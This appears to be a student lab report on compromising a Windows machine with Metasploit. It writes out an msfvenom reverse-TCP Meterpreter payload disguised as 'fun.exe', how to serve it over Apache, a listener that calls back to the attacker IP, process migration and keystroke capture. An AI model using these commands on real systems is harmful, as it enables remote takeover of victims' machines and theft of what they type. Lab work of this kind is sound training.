# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

##PROGRAM
```
NAME : Vishnu Rathan B
Reg No : 212224240185
```

## EXECUTION STEPS AND ITS OUTPUT:

![img01](https://github.com/user-attachments/assets/48184a16-ab3e-44fe-8b73-be02546358c1)



Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![img02](https://github.com/user-attachments/assets/96704f06-9b23-454b-b5f4-99890965686f)




copy the fun.exe into the apache /var/www/html folder
![img03](https://github.com/user-attachments/assets/6b6cb525-f9eb-4162-8080-bf518aef7a16)


Start apache server
sudo systemctl apache2 start

![img04](https://github.com/user-attachments/assets/c6d7a0c3-20a9-4f97-aa93-2340ae6618dc)



Check the status of apache2
![img05](https://github.com/user-attachments/assets/ab3a063a-5f1c-4634-9666-21a2c4df1ca4)



Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![img06](https://github.com/user-attachments/assets/9d2930e9-2ca2-4f41-a12d-f6bb464eeba7)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![img07](https://github.com/user-attachments/assets/a6d9de9f-0192-4578-912c-4f861fe8aa4a)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![img08](https://github.com/user-attachments/assets/75c32eb4-7e41-4099-b807-0c216ab6f81f)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![img09](https://github.com/user-attachments/assets/bc0ae88a-5538-4752-9c80-3841d56107d1)



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![img010](https://github.com/user-attachments/assets/22a7c2bf-649f-4651-ac16-793e7f4307fc)



keyscan_dump	Shows the keystrokes captured so far
![img011](https://github.com/user-attachments/assets/a8cfb90f-080e-490f-b546-b42be0d318f8)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
